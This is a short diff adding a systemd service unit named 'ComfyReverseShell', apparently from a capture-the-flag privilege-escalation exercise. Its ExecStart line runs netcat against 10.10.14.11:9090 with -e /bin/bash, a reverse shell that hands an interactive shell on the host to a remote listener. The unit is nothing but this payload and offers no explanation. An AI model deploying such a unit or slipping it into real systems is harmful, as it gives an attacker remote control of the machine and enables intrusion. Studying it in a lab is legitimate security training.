@@ -1,0 +1,8 @@
+[Unit]
+Description=ComfyReverseShell
+ConditionFileIsExecutable=/home/pepper/malicious.service
+
+[Service]
+Type=forking
+ExecStart=/bin/nc -nv 10.10.14.11 9090 -e /bin/bash
+TimeoutSec=0
